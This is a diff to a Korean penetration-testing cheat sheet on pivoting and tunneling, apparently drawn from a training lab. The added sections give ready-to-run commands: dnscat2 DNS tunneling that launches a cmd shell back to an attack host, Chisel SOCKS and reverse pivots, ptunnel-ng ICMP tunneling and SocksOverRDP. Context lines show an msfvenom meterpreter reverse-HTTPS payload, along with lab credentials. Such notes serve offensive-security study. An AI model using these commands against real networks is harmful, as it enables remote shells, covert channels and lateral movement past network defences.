@@ -24,7 +24,7 @@ socks4 	127.0.0.1 9050
 <br/><br/>
 # 2. SSH를 사용한 원격/역방향 포트 포워딩
 
-### msfvenom을 사용하여 Windows 페이로드 생성
+### Windows 페이로드 생성
 ```msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080```
 
 ### 멀티/핸들러 구성 및 시작
@@ -171,7 +171,7 @@ msf6 exploit(multi/handler) > run
 ```
 
 <br/><br/>
-# Pivoting
+# 5. Pivoting
 
 ## Windows용 SSH (plink.exe)
 
@@ -224,12 +224,128 @@ pyenv shell 2.7
 ### 포트 포워딩 확인
 ```netsh.exe interface portproxy show v4tov4```
 
+<br/><br/>
+# 6. Tunneling
 
+## Dnscat2를 사용한 DNS 터널링
 
+### dnscat2 복제 및 서버 설정
+```
+git clone https://github.com/iagox86/dnscat2.git
 
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+```
 
+### dnscat2 서버 시작
+```ruby dnscat2.rb --dns```
 
+### 공격 호스트에 dnscat2-powershell 복제
+```git clone https://github.com/lukebaggett/dnscat2-powershell.git```
 
+### dnscat2.ps1을 통해 터널 설정
+```Import-Module .\dnscat2.ps1```
+```Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd```
 
+### dnscat2 옵션 목록
+```dnscat2> ?```
 
+### 생성된 세션과의 상호 작용
+```dnscat2> window -i 1```
 
+<br/><br/>
+## SOCKS5를 이용한 터널링
+
+### Chisel 설치 및 사용
+```
+git clone https://github.com/jpillora/chisel.git
+cd chisel
+go build
+```
+
+### Chisel 바이너리를 Pivot 호스트로 전송
+```scp chisel ubuntu@10.129.202.64:~/```
+
+### Pivot 호스트에서 Chisel 서버 실행
+```./chisel server -v -p 1234 --socks5```
+
+### Chisel 서버에 연결
+```./chisel client -v 10.129.202.64:1234 socks```
+
+### proxychains.conf 편집 및 확인
+```
+tail -f /etc/proxychains.conf 
+
+# defaults set to "tor"
+# socks4 	127.0.0.1 9050
+socks5 127.0.0.1 1080
+```
+
+### DC로 Pivot
+```proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123```
+
+<br/><br/>
+## Chisel Reverse Pivot
+
+### 공격 호스트에서 Chisel 서버 시작
+```./chisel server --reverse -v -p 1234 --socks5```
+
+### Chisel 클라이언트를 공격 호스트에 연결
+```./chisel client -v 10.10.14.17:1234 R:socks```
+
+### proxychains.conf 편집 및 확인
+```
+tail -f /etc/proxychains.conf 
+
+[ProxyList]
+# add proxy here ...
+# socks4    127.0.0.1 9050
+socks5 127.0.0.1 1080
+```
+
+### DC로 Pivot
+```proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123```
+
+<br/><br/>
+## SOCKS를 사용한 ICMP 터널링
+
+### Cloning Ptunnel-ng
+```git clone https://github.com/utoni/ptunnel-ng.git```
+
+### Autogen.sh로 Ptunnel-ng 빌드
+```sudo ./autogen.sh```
+
+### 정적 바이너리를 생성
+```
+sudo apt install automake autoconf -y
+cd ptunnel-ng/
+sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
+./autogen.sh
+```
+
+### Ptunnel-ng를 Pivot 호스트로 전송
+```scp -r ptunnel-ng ubuntu@10.129.202.64:~/```
+
+### 대상 호스트에서 ptunnel-ng 서버 시작
+```sudo ./ptunnel-ng -r10.129.202.64 -R22```
+
+### 공격 호스트에서 ptunnel-ng 서버에 연결
+```sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22```
+
+### ICMP 터널을 통한 SSH 연결 터널링
+```ssh -p2222 -lubuntu 127.0.0.1```
+
+### SSH를 통한 동적 포트 포워딩 활성화
+```ssh -D 9050 -p2222 -lubuntu 127.0.0.1```
+
+<br/><br/>
+# 7. Double Pivoting
+
+## SocksOverRDP를 사용한 RDP 및 SOCKS 터널링
+
+### regsvr32.exe를 사용하여 SocksOverRDP.dll 로딩
+```regsvr32.exe SocksOverRDP-Plugin.dll```
+
+### SOCKS 리스너가 시작되었는지 확인
+```netstat -antb | findstr 1080```
